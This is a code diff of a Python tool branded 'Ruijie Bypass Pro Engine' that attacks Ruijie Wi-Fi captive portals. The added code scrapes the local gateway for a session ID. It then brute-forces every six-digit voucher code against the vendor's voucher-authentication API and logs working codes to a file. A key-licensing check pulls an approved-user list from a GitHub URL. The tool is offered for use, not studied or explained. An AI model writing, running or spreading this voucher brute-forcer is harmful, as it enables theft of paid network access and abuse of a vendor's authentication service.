@@ -1,149 +1,171 @@
-#!/usr/bin/python3
-#-*- coding:utf-8 -*-
-
 import os
+import re
 import sys
+import zlib
+import json
 import time
-import uuid
-import datetime
+import ping3
+import ntplib
+import base64
+import random
+import string
+import urllib
+import marshal
+import aiohttp
+import asyncio
+import hashlib
+import argparse
+import requests
 import subprocess
+from datetime import datetime, timedelta
+from urllib.parse import quote
+from Crypto.PublicKey import RSA
+from Crypto.Util.Padding import pad
+from Crypto.Cipher import AES, PKCS1_v1_5
+from Crypto.Random import get_random_bytes
+from concurrent.futures import ThreadPoolExecutor
 
-# ==========================================================
-# AUTO DEPENDENCY INSTALLER (လိုအပ်တာတွေကို အလိုအလျောက်သွင်းပေးခြင်း)
-# ==========================================================
-try:
-    import requests
-except ImportError:
-    print("\n[*] Installing 'requests' library... Please wait.")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-    import requests
+# --- Global Configurations ---
+SUCCESS = 0
+IN_RUNNING_ASCII_BIN = []
+MY = ""
+w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"
 
-# ==========================================================
-# COLORS (အရောင်များ)
-# ==========================================================
-R = '\033[1;31m' # Red
-G = '\033[1;32m' # Green
-Y = '\033[1;33m' # Yellow
-C = '\033[1;36m' # Cyan
-W = '\033[1;37m' # White
-B = '\033[1;34m' # Blue
+# --- Utility Functions ---
+def clear():
+    os.system("clear")
 
-# ==========================================================
-# GITHUB CONFIGURATION
-# ==========================================================
-GITHUB_USER = "hhtethtet277-svg"
-REPO_NAME = "my-database-"
-# Raw Link မှတစ်ဆင့် key.txt ကို ဖတ်မည်
-KEY_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/key.txt"
+def Line():
+    print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")
 
-# ==========================================================
-# LOGO / BANNER (Moe Yu Starlink Bypass Design)
-# ==========================================================
-def logo():
-    os.system('clear')
-    print(f"""
-{C}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-{G}   __  __  ____  _____  __   __ _   _ 
-{G}  |  \/  |/ __ \|  ___| \ \ / /| | | |
-{G}  | \  / | |  | | |__    \ V / | | | |
-{G}  | |\/| | |  | |  __|    \ /  | | | |
-{G}  | |  | | |__| | |___    | |  | |_| |
-{G}  |_|  |_|\____/|_____|   |_|   \___/ 
-{Y}        MOE YU BYPASS PRO ENGINE v22.0
-{Y}               (မင်္ဂလာပါ)
-{C}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-{W} » Author   : {G}Moe Yu
-{W} » Project  : {G}Starlink / Network Bypass
-{W} » File     : {G}moe_yu.py
-{W} » Status   : {G}Immortal Premium {Y}[Online]
-{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    """)
+def Logo():
+    clear()
+    logo = f"""{r},-_/         .     ,--. .        .
+'  | . . ,-. |-   | `-' |  . ,-. | ,
+   | | | `-. |    |   . |  | |   |<
+   | `-^ `-' `'   `--'  `' ' `-' ' `
+/` |
+`--'  {g}              Created by MOE YU\033[1;00m"""
+    print(logo)
+    Line()
+    print(f"{w}[*] Developer: Moe Yu")
+    print(f"{w}[*] Tool: Ruijie Bypass Pro Engine v22.0")
+    Line()
 
-# ==========================================================
-# HWID & SECURITY CHECK
-# ==========================================================
-def get_hwid():
-    # ဖုန်း၏ ID ကို တိကျစွာ ထုတ်ယူရန် (UUID version)
-    id = str(uuid.uuid4())[:12].upper()
-    return id
-
-def check_auth():
-    my_id = get_hwid()
-    print(f"{W}[{G}#{W}] YOUR HWID : {G}{my_id}")
-    print(f"{W}[{G}*{W}] STATUS    : {C}Checking Authorization...")
-    time.sleep(2)
-
+# --- Expiration & Key System Logic ---
+def get_current_time():
     try:
-        # GitHub မှ Approved HWID စာရင်းကို လှမ်းစစ်ခြင်း
-        response = requests.get(KEY_URL, timeout=15)
+        client = ntplib.NTPClient()
+        response = client.request('pool.ntp.org', version=3)
+        return time.ctime(response.tx_time)
+    except:
+        return time.ctime() # Network မရလျှင် Local time သုံးမည်
+
+def check_key_expiration(expiration_time, current_time):
+    # Format: mm-hh-dd-MM-yyyy
+    try:
+        exp_dt = datetime.strptime(expiration_time, "%M-%H-%d-%m-%Y")
+        cur_dt = datetime.strptime(current_time, "%a %b %d %H:%M:%S %Y")
         
-        if response.status_code == 200:
-            approved_keys = response.text
-            if my_id in approved_keys:
-                print(f"{G}[✔] ACCESS GRANTED! Welcome back, Moe Yu.")
-                time.sleep(1)
-                return True
-            else:
-                print(f"{R}[✘] HWID NOT REGISTERED!")
-                print(f"{Y}[!] Please add {W}{my_id}{Y} to your 'key.txt' on GitHub.")
-                # တကယ်သုံးတဲ့အခါ register မလုပ်ထားရင် ပိတ်ထားချင်ရင် sys.exit() ကို ဖွင့်ပါ
-                # sys.exit()
-                return True # လက်ရှိတွင် အလုပ်ဆက်လုပ်ရန် True ထားပေးထားပါသည်
-        else:
-            print(f"{R}[!] GitHub Server Error! Status Code: {response.status_code}")
-            sys.exit()
-            
-    except requests.exceptions.ConnectionError:
-        print(f"{R}[!] NO INTERNET! Please check your connection.")
-        sys.exit()
-    except Exception as e:
-        print(f"{R}[!] ERROR: {e}")
-        sys.exit()
+        if exp_dt > cur_dt:
+            return (True, exp_dt > cur_dt + timedelta(minutes=30))
+        return (False, False)
+    except:
+        return (False, False)
 
-# ==========================================================
-# MAIN BYPASS ENGINE (အဓိက အလုပ်လုပ်သည့် နေရာ)
-# ==========================================================
-def run_engine():
-    print(f"\n{C}[+] INITIALIZING ENGINE... PLEASE WAIT.")
-    time.sleep(1.5)
+def get_uid():
+    uid = str(os.getlogin()) + str(os.getuid())
+    return hashlib.md5(uid.encode()).hexdigest()[:15].upper()
+
+async def security_check():
+    uid = get_uid()
+    current_time = get_current_time()
+    # GitHub မှ key database ကို လှမ်းစစ်ခြင်း
+    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
     
-    # Target Configuration (ပြောင်းလဲနိုင်သည်)
-    target_ip = "http://192.168.1.1" 
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Starlink-Bypass)",
-        "Accept": "*/*",
-        "Connection": "keep-alive"
-    }
-
-    print(f"{G}[+] ENGINE STARTED SUCCESSFULLY!")
-    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-
-    count = 1
     try:
-        while True:
-            current_time = datetime.datetime.now().strftime("%H:%M:%S")
-            
-            # ဤနေရာတွင် Payload ပို့ခြင်းများကို လုပ်ဆောင်နိုင်သည်
-            # try: requests.get(target_ip, headers=headers, timeout=5)
-            # except: pass
-            
-            print(f"{W}[{current_time}] {G}STATUS: {W}ACTIVE {G}| {Y}SESSION: {W}STABLE {G}| {W}PKT: {G}{count}")
-            
-            count += 1
-            # ၅ စက္ကန့်ခြားတစ်ခါ Loop ပတ်မည် (စိတ်ကြိုက် ပြောင်းနိုင်သည်)
-            time.sleep(3)
-            
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] PROCESS TERMINATED BY USER. SHUTTING DOWN...")
+        response = requests.get(key_url).text
+        for line in response.splitlines():
+            if "~" in line:
+                db_uid, exp_date = line.split("~")
+                if db_uid == uid:
+                    is_valid, is_long = check_key_expiration(exp_date, current_time)
+                    if is_valid:
+                        return True
+                    else:
+                        print(f"{r}[!] Key Expired!")
+                        sys.exit()
+        
+        print(f"{r}[!] Key Not Found!")
+        print(f"{g}Your UID: {uid}")
+        sys.exit()
+    except:
+        print(f"{r}[!] Connection Error!")
         sys.exit()
 
-# ==========================================================
-# EXECUTION
-# ==========================================================
+# --- Core Functional Classes ---
+class Setup:
+    def set(self):
+        Logo()
+        print(f"{g}[+] Scanning Ruijie Gateway...")
+        try:
+            res = requests.get("http://192.168.0.1", timeout=10)
+            gw_ip = re.search(r'gw_address=(.*?)&', res.url).group(1)
+            session_url = "https://portal-as.ruijienetworks.com" + re.search(r"href='(.*?)'", res.text).group(1)
+            
+            with open(".ip", "w") as f: f.write(gw_ip)
+            with open(".session_url", "w") as f: f.write(session_url)
+            print(f"{g}[+] Setup Success! IP: {gw_ip}")
+        except:
+            print(f"{r}[!] Setup Failed. Connect to Wi-Fi first.")
+
+class VoucherAttack:
+    def __init__(self, mode="digit", length=6):
+        self.mode = mode
+        self.length = length
+        self.session_url = open(".session_url").read().strip() if os.path.exists(".session_url") else None
+
+    async def start(self):
+        if not self.session_url: return
+        Logo()
+        print(f"{g}[*] Attacking with mode: {self.mode} ({self.length} digits)")
+        
+        async with aiohttp.ClientSession() as session:
+            # Get Session ID
+            async with session.get(self.session_url) as r:
+                sid = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
+            
+            # Simple digit brute loop
+            for i in range(10**self.length):
+                voucher = str(i).zfill(self.length)
+                await self.login(session, sid, voucher)
+
+    async def login(self, session, sid, voucher):
+        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/"
+        data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
+        try:
+            async with session.post(url, json=data) as resp:
+                if 'logonUrl' in await resp.text():
+                    print(f"{g}[SUCCESS] {voucher}")
+                    with open("success.txt", "a") as f: f.write(voucher + "\n")
+        except: pass
+
+# --- Main Entry ---
+async def main():
+    await security_check() # Key စစ်မည်
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-o", "--option", choices=["setup", "attack"], required=True)
+    args = parser.parse_args()
+
+    if args.option == "setup":
+        Setup().set()
+    elif args.option == "attack":
+        attack = VoucherAttack()
+        await attack.start()
+
 if __name__ == "__main__":
     try:
-        logo()
-        if check_auth():
-            run_engine()
-    except Exception as e:
-        print(f"{R}[!] Critical Error: {e}")
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n{y}[!] Stopped.")
